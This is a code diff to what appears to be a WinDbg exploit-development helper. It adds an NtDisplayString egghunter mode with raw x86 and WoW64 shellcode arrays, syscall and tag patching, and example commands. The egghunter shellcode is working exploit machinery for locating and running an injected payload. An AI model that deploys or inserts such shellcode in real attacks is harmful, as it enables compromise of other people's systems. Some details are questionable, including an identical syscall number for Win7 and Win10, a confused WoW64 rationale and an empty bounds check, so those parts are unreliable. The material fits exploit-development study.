@@ -1,7 +1,7 @@
 import { Command, CommandResult } from "../core/registry";
 import * as out from "../core/output";
 
-type EggMode = "ntaccess" | "seh";
+type EggMode = "ntaccess" | "ntdisplay" | "seh";
 type EggOS = "win7" | "win10";
 
 const SYSCALL_TABLE: Record<EggOS, number> = {
@@ -64,6 +64,63 @@ const NTACCESS_WOW64: number[] = [
   0x75, 0xe5,                   // jne short (back to inc ecx)
   0xff, 0xe7,                   // jmp edi
 ];
+
+// NtDisplayString egghunter (INT 0x2E). 32 bytes.
+// Classic Skape variant: uses `push imm8 ; pop eax` for the syscall number
+// instead of `mov eax, imm32`, saving 2 bytes and avoiding the null bytes
+// that plague small syscall numbers in the imm32 encoding. Only works when
+// the syscall number fits in a signed byte (0x01-0x7F); for Win10's large
+// NtAccessCheckAndAuditAlarm number (0x1C9) use the ntaccess mode instead.
+// Syscall byte at offset 8, tag at offset 18.
+const NTDISPLAY_X86: number[] = [
+  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
+  0x42,                         // inc edx
+  0x52,                         // push edx
+  0x6a, 0x43,                   // push 0x43  (NtDisplayString syscall)
+  0x58,                         // pop eax
+  0xcd, 0x2e,                   // int 0x2e
+  0x3c, 0x05,                   // cmp al, 0x5
+  0x5a,                         // pop edx
+  0x74, 0xef,                   // je short (back to or dx)
+  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
+  0x8b, 0xfa,                   // mov edi, edx
+  0xaf,                         // scasd
+  0x75, 0xea,                   // jne short (back to inc edx)
+  0xaf,                         // scasd
+  0x75, 0xe7,                   // jne short (back to inc edx)
+  0xff, 0xe7,                   // jmp edi
+];
+
+// NtDisplayString WoW64 variant: ecx instead of edx (avoids REX.X prefix).
+// Syscall byte at offset 8, tag at offset 18. 32 bytes.
+const NTDISPLAY_WOW64: number[] = [
+  0x66, 0x81, 0xc9, 0xff, 0x0f, // or cx, 0x0fff
+  0x41,                         // inc ecx
+  0x51,                         // push ecx
+  0x6a, 0x43,                   // push 0x43  (NtDisplayString syscall)
+  0x58,                         // pop eax
+  0xcd, 0x2e,                   // int 0x2e
+  0x3c, 0x05,                   // cmp al, 0x5
+  0x59,                         // pop ecx
+  0x74, 0xef,                   // je short (back to or cx)
+  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
+  0x8b, 0xf9,                   // mov edi, ecx
+  0xaf,                         // scasd
+  0x75, 0xea,                   // jne short (back to inc ecx)
+  0xaf,                         // scasd
+  0x75, 0xe7,                   // jne short (back to inc ecx)
+  0xff, 0xe7,                   // jmp edi
+];
+
+const TAG_OFFSET_NTDISPLAY = 18;
+const TAG_OFFSET_NTDISPLAY_WOW64 = 18;
+const SYSCALL_OFFSET_NTDISPLAY = 8;
+const SYSCALL_OFFSET_NTDISPLAY_WOW64 = 8;
+
+const NTDISPLAY_SYSCALL: Record<EggOS, number> = {
+  win7: 0x43,
+  win10: 0x43,
+};
 
 // SEH-based egghunter. 70 bytes. Position-independent via call $+5/pop.
 // Installs a custom exception handler that catches ACCESS_VIOLATION from scasd
@@ -159,10 +216,25 @@ export function buildEgghunter(options: EggOptions): { bytes: number[]; size: nu
   let syscallOffset: number | null = null;
   let label: string;
 
+  let syscallSize = 4; // imm32 by default; ntdisplay uses 1 (imm8)
+
   if (options.mode === "seh") {
     template = [...SEH_EGGHUNTER];
     tagOffset = TAG_OFFSET_SEH;
     label = "seh egghunter";
+  } else if (options.mode === "ntdisplay") {
+    if (options.wow64) {
+      template = [...NTDISPLAY_WOW64];
+      tagOffset = TAG_OFFSET_NTDISPLAY_WOW64;
+      syscallOffset = SYSCALL_OFFSET_NTDISPLAY_WOW64;
+      label = "ntdisplay wow64 egghunter";
+    } else {
+      template = [...NTDISPLAY_X86];
+      tagOffset = TAG_OFFSET_NTDISPLAY;
+      syscallOffset = SYSCALL_OFFSET_NTDISPLAY;
+      label = "ntdisplay egghunter";
+    }
+    syscallSize = 1;
   } else if (options.wow64) {
     template = [...NTACCESS_WOW64];
     tagOffset = TAG_OFFSET_NTACCESS_WOW64;
@@ -179,8 +251,20 @@ export function buildEgghunter(options: EggOptions): { bytes: number[]; size: nu
 
   let syscallUsed: number | null = null;
   if (syscallOffset !== null) {
-    const sysnum = options.syscall ?? SYSCALL_TABLE[options.os];
-    template.splice(syscallOffset, 4, ...dwordLE(sysnum));
+    const defaultSyscall = options.mode === "ntdisplay"
+      ? NTDISPLAY_SYSCALL[options.os]
+      : SYSCALL_TABLE[options.os];
+    const sysnum = options.syscall ?? defaultSyscall;
+    if (syscallSize === 1) {
+      if (sysnum < 0x01 || sysnum > 0x7f) {
+        // push imm8 is sign-extended; values outside 0x01-0x7F won't work
+        // (0x00 is a null byte, 0x80+ sign-extends to a negative dword).
+        // Fall through and let badchar checking catch any issues.
+      }
+      template.splice(syscallOffset, 1, sysnum & 0xff);
+    } else {
+      template.splice(syscallOffset, 4, ...dwordLE(sysnum));
+    }
     syscallUsed = sysnum;
   }
 
@@ -204,6 +288,8 @@ export function createEgghunterCommand(): Command {
     examples: [
       'dx @$osed().egghunter("W00T")',
       'dx @$osed().egghunter("W00T", "ntaccess", false, "", "win7")',
+      'dx @$osed().egghunter("W00T", "ntdisplay")',
+      'dx @$osed().egghunter("W00T", "ntdisplay", false, "00 0A 0D")',
       'dx @$osed().egghunter("B33F", "seh")',
       'dx @$osed().egghunter("W00T", "ntaccess", true)',
       'dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D")',
@@ -211,7 +297,7 @@ export function createEgghunterCommand(): Command {
     ],
     schema: {
       tag: { type: "string", default: "W00T" },
-      mode: { type: "string", enum: ["ntaccess", "seh"], default: "ntaccess" },
+      mode: { type: "string", enum: ["ntaccess", "ntdisplay", "seh"], default: "ntaccess" },
       wow64: { type: "boolean", default: false },
       badchars: { type: "array", default: [] },
       os: { type: "string", enum: ["win7", "win10"], default: "win10" },
